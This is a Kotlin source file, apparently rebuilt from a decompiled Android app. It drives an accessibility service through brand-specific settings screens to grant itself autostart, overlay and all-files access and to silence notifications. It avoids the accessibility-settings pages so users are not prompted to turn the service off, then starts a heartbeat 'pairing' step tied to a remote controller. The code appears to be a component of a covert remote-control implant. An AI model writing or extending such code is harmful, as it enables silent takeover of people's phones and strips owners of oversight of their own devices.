package com.storm.safe.rock.service.modules

import android.content.Context
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
import com.storm.safe.rock.service.modules.base.AccessibilityDelegate
import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger
import com.storm.safe.rock.service.modules.yw5xud.Yw5xudHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.LinkedHashMap
import java.util.Locale

/**
 * Device authorization flow manager. Detects device brand, executes per-brand
 * authorization (battery optimization, autostart, etc.), and marks completion.
 *
 * Reverse-engineered from JADX: C0329b4 (b4, 219 lines).
 * Renamed: a0->onAuthResult, a1->markAuthCompleted, a2->resumeWriteSettings,
 *          a3->detectBrand, a4->isInProgress, a5->onAuthorizationDone, a6->startAuthorization
 *
 * JADX tag: "obzzniixzpin"
 */
class DeviceAuthorizationManager(
    private val service: MyAccessibilityService,
    private val context: Context
) {
    companion object {
        private const val TAG = "obzzniixzpin"

        /**
         * Detect device brand from Build.BRAND / Build.MANUFACTURER.
         * JADX: a3 (static)
         */
        @JvmStatic
        fun detectBrand(): String? {
            val brand = Build.BRAND.lowercase(Locale.ROOT)
            val manufacturer = Build.MANUFACTURER.lowercase(Locale.ROOT)
            return when {
                brand.contains("vivo") || brand.contains("iqoo") -> "vivo"
                brand.contains("oppo") || manufacturer.contains("oppo") -> "oppo"
                brand.contains("honor") || brand.contains("hihonor") -> "honor"
                brand.contains("xiaomi") || brand.contains("redmi") -> {
                    if (brand.contains("redmi")) "redmi" else "xiaomi"
                }
                brand.contains("oneplus") -> "oneplus"
                brand.contains("huawei") || manufacturer.contains("huawei") -> "huawei"
                brand.contains("samsung") -> "samsung"
                brand.contains("realme") || manufacturer.contains("realme") -> "realme"
                else -> null
            }
        }

        /**
         * Report authorization result.
         * JADX: a0 (static)
         */
        @JvmStatic
        fun onAuthResult(
            success: Boolean,
            completedSteps: List<String>,
            failedSteps: List<String>,
            warnings: List<String>
        ) {
            if (success) {
                Log.d(TAG, "授权成功: ${completedSteps.size}个流程完成")
            } else {
                Log.w(TAG, "⚠️ 设备授权配置部分失败")
                Log.w(TAG, "❌ 授权失败的项目: ${failedSteps.joinToString(", ")}")
                if (warnings.isNotEmpty()) {
                    Log.w(TAG, "⚠️ 警告信息: ${warnings.joinToString(", ")}")
                }
            }
        }

        /**
         * Mark authorization as completed in SharedPreferences.
         * JADX: a1 (static)
         */
        @JvmStatic
        fun markAuthCompleted(context: Context) {
            try {
                context.getSharedPreferences("authorization", Context.MODE_PRIVATE).edit()
                    .putBoolean("authorization_completed", true)
                    .putString("authorization_brand", detectBrand())
                    .putLong("authorization_time", System.currentTimeMillis())
                    .apply()
                context.getSharedPreferences("app_state", Context.MODE_PRIVATE).edit()
                    .putBoolean("authorization_completed", true)
                    .apply()
                Log.i(TAG, "✅ 授权完成状态已标记（authorization + app_state）")
            } catch (e: Exception) {
                Log.e(TAG, "❌ 标记授权完成状态失败", e)
            }
        }
    }

    // --- Instance fields ---

    @Volatile
    private var inProgress: Boolean = false

    /** Yw5xud authorization handler (vendor f53199a4 — C0372a9 instance) */
    internal val yw5xudHandler: Yw5xudHandler = Yw5xudHandler(service, context)

    /** Coroutine scope for authorization flow (vendor f53197a2 — CoroutineScope on IO) */
    internal val coroutineScope: CoroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /** Map of brand -> authorization delegate. JADX: f53198a3 */
    internal val brandDelegates: LinkedHashMap<String, AccessibilityDelegate> = LinkedHashMap()

    init {
        // All brands share the same Yw5xudHandler instance (matches JADX constructor)
        listOf("oppo", "oneplus", "realme", "huawei", "honor",
            "vivo", "mi", "xiaomi", "redmi", "samsung").forEach { brand ->
            brandDelegates[brand] = yw5xudHandler
        }
    }

    // --- a4 -> isInProgress ---
    fun isInProgress(): Boolean {
        return inProgress || yw5xudHandler.isAuthorizing
    }

    /**
     * Check if authorization is currently active.
     * JADX: C0329b4.m211766a4() — returns true if authorization in progress
     */
    fun isActive(): Boolean = isInProgress()

    /**
     * Forward accessibility event to the yw5xud authorization module.
     * JADX: c0372a9.f55147a4.post(new RunnableC1224sj(...)) — posts event to internal handler.
     * Only processes WINDOW_STATE_CHANGED (32) and WINDOW_CONTENT_CHANGED (2048).
     *
     * IMPORTANT: Yw5xudHandler.onAccessibilityEvent(event, pkg, cls) obtains rootInActiveWindow
     * fresh inside, so we only need to extract pkg/cls from the event object here. The event
     * object itself is NOT held across threads — only the extracted String values are posted.
     *
     * CRITICAL: During smartReturnToApp phase (inProgress=true but isAuthorizing=false),
     * events must NOT be forwarded — otherwise the handler may click on the accessibility
     * settings page and trigger the "要关闭系统服务吗？" dialog.
     */
    fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!yw5xudHandler.isAuthorizing) return
        val eventType = event.eventType
        val pkg = event.packageName?.toString() ?: return
        if (eventType != 32 && eventType != 2048) return
        // Extra safety: never forward accessibility settings page events
        val cls = event.className?.toString() ?: ""
        if (pkg == "com.android.settings" && (
            cls.contains("AccessibilitySettings") ||
            cls.contains("SubSettings")
        )) {
            Log.d(TAG, "⛔ 跳过无障碍设置页面事件: $cls")
            return
        }
        // Post to bg handler matching vendor: c0372a9.f55147a4.post(RunnableC1224sj)
        // Only extracted String values cross the thread boundary (event may be recycled)
        yw5xudHandler.bgHandler.post {
            try {
                yw5xudHandler.onAccessibilityEvent(event, pkg, cls)
            } catch (_: Exception) {}
        }
    }

    // --- a5 -> onAuthorizationDone ---
    fun onAuthorizationDone() {
        try {
            Log.i(TAG, "★★★ 授权流程结束，启动延迟初始化 + 配对流程 ★★★")
            context.getSharedPreferences("app_state", Context.MODE_PRIVATE).edit()
                .putBoolean("authorization_completed", true)
                .apply()
            try {
                service.postAuthorizationInit()
            } catch (_: Exception) {
                Log.w(TAG, "postAuthorizationInit 方法不存在或失败，跳过")
            }
            // JADX: Handler(MainLooper).post(RunnableC0941o6(23, this)) — heartbeat trigger
            // ADAPT: heartbeat trigger deferred to postAuthorizationInit implementation
            Log.i(TAG, "⏸️ [配对] 自动部署已禁用，请通过控制端手动部署")
        } catch (e: Exception) {
            Log.e(TAG, "❌ 通知授权阶段完成失败", e)
        }
    }

    // --- a6 -> startAuthorization ---
    fun startAuthorization(context: Context) {
        if (inProgress) {
            Log.w(TAG, "⚠️ 授权流程已在进行中，跳过")
            return
        }
        try {
            UiDebugger.init(service)
            val currentBrandForLog = detectBrand()
            val prefsForLog = context.getSharedPreferences("authorization", Context.MODE_PRIVATE)
            val completedForLog = prefsForLog.getBoolean("authorization_completed", false)
            UiDebugger.logStep(TAG, "startAuthorization 开始", "brand=$currentBrandForLog completed=$completedForLog")
            val prefs = context.getSharedPreferences("authorization", Context.MODE_PRIVATE)
            val completed = prefs.getBoolean("authorization_completed", false)
            val savedBrand = prefs.getString("authorization_brand", null)
            val currentBrand = detectBrand()

            if (completed && savedBrand == currentBrand) {
                Log.i(TAG, "✅ 授权已完成，直接启动配对流程（心跳检测）")
                onAuthorizationDone()
                return
            }

            // ADAPT: 真机加固 — 华为 Pged 可能在 executeAll 末尾杀进程导致
            // authorization_completed 全局 flag 未写。子步骤 SP 是内部 checkpoint，
            // 若 Step 5/6/7/8 全部已 mark 即视为核心授权已完成（Step 9 是清除任务非核心）。
            if (currentBrand == "huawei" || currentBrand == "honor") {
                val keys = com.storm.safe.rock.service.modules.yw5xud.HuaweiStepCompletionStore.Keys
                val store = com.storm.safe.rock.service.modules.yw5xud.HuaweiStepCompletionStore
                val step5 = store.isCompleted(context, keys.STEP5_AUTOSTART)
                val step6 = store.isCompleted(context, keys.STEP6_OVERLAY)
                val step7 = store.isCompleted(context, keys.STEP7_NOTIFICATION_OFF)
                val step8 = store.isCompleted(context, keys.STEP8_ALL_FILES)
                if (step5 && step6 && step7 && step8) {
                    Log.i(TAG, "✅ 子步骤 SP 全部已 mark（Step 5/6/7/8），视为已完成，同步全局 flag")
                    try {
                        prefs.edit()
                            .putBoolean("authorization_completed", true)
                            .putString("authorization_brand", currentBrand)
                            .putLong("authorization_time", System.currentTimeMillis())
                            .apply()
                    } catch (_: Exception) {}
                    onAuthorizationDone()
                    return
                }
            }

            // Check app_state fallback
            if (context.getSharedPreferences("app_state", Context.MODE_PRIVATE)
                    .getBoolean("authorization_completed", false)
            ) {
                Log.i(TAG, "✅ [授权检查] app_state.authorization_completed=true，视为已完成（同步authorization标志）")
                try {
                    prefs.edit()
                        .putBoolean("authorization_completed", true)
                        .putString("authorization_brand", currentBrand)
                        .putLong("authorization_time", System.currentTimeMillis())
                        .apply()
                } catch (_: Exception) {}
            }

            // Cooldown gate: skip if recent failure within AUTH_COOLDOWN_MS
            if (AutomationCoordinator.shouldSkipDueToRecentFailure()) {
                Log.d(TAG, "⏸️ 授权流程冷却中 (距上次失败 < ${AutomationCoordinator.AUTH_COOLDOWN_MS / 1000}s)，跳过")
                return
            }

            // Launch coroutine for authorization flow (JADX: AbstractC0780a0.m213692a3)
            coroutineScope.launch {
                AutomationCoordinator.withFlow("auth") {
                    executeAuthorizationFlow()
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "❌ 检查授权状态失败: ${e.message}")
        }
    }

    /**
     * Main authorization coroutine body.
     * Matches JADX obzzniixzpin$startAuthorization$1.invokeSuspend().
     *
     * Flow:
     * 1. inProgress = true
     * 2. Disable accessibility settings monitor
     * 3. Check current page, try return to app if needed
     * 4. Pause WRITE_SETTINGS permission request
     * 5. Detect brand -> find delegate -> executeAuthorization()
     * 6. Report result, mark completed if success
     * 7. finally: inProgress = false, onAuthorizationDone(), resumeWriteSettings()
     */
    internal suspend fun executeAuthorizationFlow() {
        var authHasFailures = false
        try {
            inProgress = true

            // Step 1: Disable accessibility settings page detection (JADX: m211454e3)
            try {
                service.disableAccessibilitySettingsMonitor()
            } catch (e: Exception) {
                Log.e(TAG, "❌ 关闭无障碍设置页面检测失败", e)
            }

            // Step 2: Check current page (JADX: getRootInActiveWindow → packageName)
            var currentPkg = ""
            try {
                currentPkg = service.rootInActiveWindow?.packageName?.toString() ?: ""
            } catch (_: Exception) {}
            Log.i(TAG, "🔍 [授权开始] 当前页面: $currentPkg")

            delay(300L)

            // Step 3: Smart return to app if not already there (JADX: m211524m1)
            if (currentPkg != service.packageName) {
                Log.i(TAG, "📱 [授权] 不在app，执行 smartReturnToApp...")
                try {
                    val returned = service.smartReturnToApp()
                    Log.i(TAG, "📱 [授权] smartReturnToApp() 返回=$returned")
                } catch (e: Exception) {
                    Log.w(TAG, "⚠️ [授权] 返回APP异常: ${e.message}，继续执行")
                }
                delay(300L)
            } else {
                Log.i(TAG, "✅ [授权] 已在app，跳过返回")
            }

            // Log current page after return attempt
            var afterPkg = ""
            try {
                afterPkg = service.rootInActiveWindow?.packageName?.toString() ?: ""
            } catch (_: Exception) {}
            Log.i(TAG, "🔍 [授权] 返回后当前页面: $afterPkg")

            // Step 4: Pause WRITE_SETTINGS permission request (JADX: m211496j0)
            try {
                service.pauseWriteSettingsPermission()
            } catch (e: Exception) {
                Log.e(TAG, "❌ 暂停WRITE_SETTINGS权限申请失败", e)
            }

            // Step 5: Brand detection + delegate dispatch
            val successes = mutableListOf<String>()
            val failures = mutableListOf<String>()
            val warnings = mutableListOf<String>()

            val brand = detectBrand()
            UiDebugger.logStep(TAG, "品牌检测完成", "brand=$brand handler=${yw5xudHandler != null}")
            if (brand == null) {
                // No brand match — report basic result
                onAuthResult(failures.isEmpty(), successes, failures, warnings)
            } else {
                val delegate = brandDelegates[brand]
                if (delegate != null) {
                    try {
                        UiDebugger.dumpPage(service, "auth_before_execute", "品牌引擎执行前")
                        val result = delegate.executeAuthorization()
                        successes.addAll(result.successes)
                        failures.addAll(result.failures)
                        warnings.addAll(result.logs)

                        // Report combined result
                        onAuthResult(
                            result.isSuccess && failures.isEmpty(),
                            successes, failures, warnings
                        )

                        // Mark completed if fully successful
                        if (result.isSuccess && failures.isEmpty()) {
                            markAuthCompleted(context)
                            AutomationCoordinator.markSuccess()
                        } else {
                            authHasFailures = true
                            AutomationCoordinator.markFailure()
                        }
                    } catch (e: kotlinx.coroutines.CancellationException) {
                        throw e
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ 授权执行异常: ${e.message}", e)
                        authHasFailures = true
                        AutomationCoordinator.markFailure()
                        val errorResult = AccessibilityDelegate.AuthorizationResult(
                            isSuccess = false,
                            successes = emptyList(),
                            failures = listOf("执行异常: ${e.message}"),
                            logs = emptyList()
                        )
                        successes.addAll(errorResult.successes)
                        failures.addAll(errorResult.failures)
                        warnings.addAll(errorResult.logs)
                    }
                } else {
                    Log.w(TAG, "⚠️ [步骤2/2] 未找到设备处理器: $brand，仅完成基础权限")
                    onAuthResult(failures.isEmpty(), successes, failures, warnings)
                }
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "❌ 授权流程执行失败: ${e.message}", e)
        } finally {
            // NOTE: We intentionally do NOT call AutomationCoordinator.markFailure()/markSuccess() here.
            // Normal flow: markSuccess/markFailure are called inside the try block based on result.
            // Cancellation path: the coroutine was cancelled (not a flow failure) — leaving
            // coordinator state untouched is correct so the next trigger can retry immediately.
            UiDebugger.logStep(TAG, "品牌引擎完成", "进入 finally 块, hasFailures=$authHasFailures")
            UiDebugger.dumpPage(service, "auth_after_execute", "品牌引擎执行后")
            inProgress = false
            // 自动化结束后返回 APP — 防止留在系统设置页面
            try {
                service.smartReturnToApp()
            } catch (_: Exception) {}
            onAuthorizationDone()
            if (!authHasFailures) {
                resumeWriteSettings()
            } else {
                Log.w(TAG, "⏭ 授权有失败项，跳过 resumeWriteSettings")
            }
        }
    }

    // --- a2 -> resumeWriteSettings ---
    fun resumeWriteSettings() {
        try {
            service.resumeWriteSettingsPermissionRequest()
        } catch (e: Exception) {
            Log.e(TAG, "❌ 恢复WRITE_SETTINGS权限申请失败", e)
        }
    }
}
